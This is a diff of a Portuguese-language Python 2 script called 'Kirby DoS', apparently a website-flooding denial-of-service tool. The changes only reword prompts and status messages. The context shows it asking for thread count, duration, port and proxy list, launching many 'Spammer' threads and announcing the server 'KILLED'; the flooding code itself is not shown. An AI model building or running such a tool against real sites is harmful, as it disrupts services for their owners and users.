@@ -1,7 +1,6 @@
 #python2
 #hamsterdoctor
 import random
-from termcolor import colored 
 import socket
 import threading
 import time
@@ -19371,11 +19370,11 @@ time.sleep(2)
 
 if __name__ == '__main__':
     try:
-        num_threads = input('> Quantas Requisições?')
-        t_tot = input('> Tempo (2/1):')
-        port = raw_input('> Porta (80 Default):')
+        num_threads = input('> Quantas Requests?')
+        t_tot = input('> Tempo:')
+        port = raw_input('> Porta:')
 		#Proxy
-        in_file = open(raw_input("> Proxy (Pressione enter para não): "),"r")
+        in_file = open(raw_input("> Proxy: "),"r")
         proxyf = in_file.read()
 
 
@@ -19391,15 +19390,15 @@ if __name__ == '__main__':
         try:
             urllib.urlopen(url)
         except IOError:
-            print 'Erro, confira a URL e sua conexão (Kirby DoS 1U834R.1L) '
+            print 'Erro, confira a URL e sua internet'
         else:
             break
     for i in xrange(num_threads):
         Spammer(url, i + 1).start()
     
     time.sleep(2)
-    print("O Site está lento . . . ")
-    print("Kirby Atacando :<!")
+    print(" ATAQUE SUPREMO!")
+    print("Kirby Atacando !")
 
 
     print("-------------------------------------------------------------------------")
@@ -19407,7 +19406,7 @@ if __name__ == '__main__':
         time.sleep(0.001)
         Request = 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
         timer -= 0.001
-    print 'Ataque concluído com sucesso!'
+    print 'Ataque feito com sucesso!'
     print 'Kirby KILLED THE SERVER'
 
     time.sleep(1)
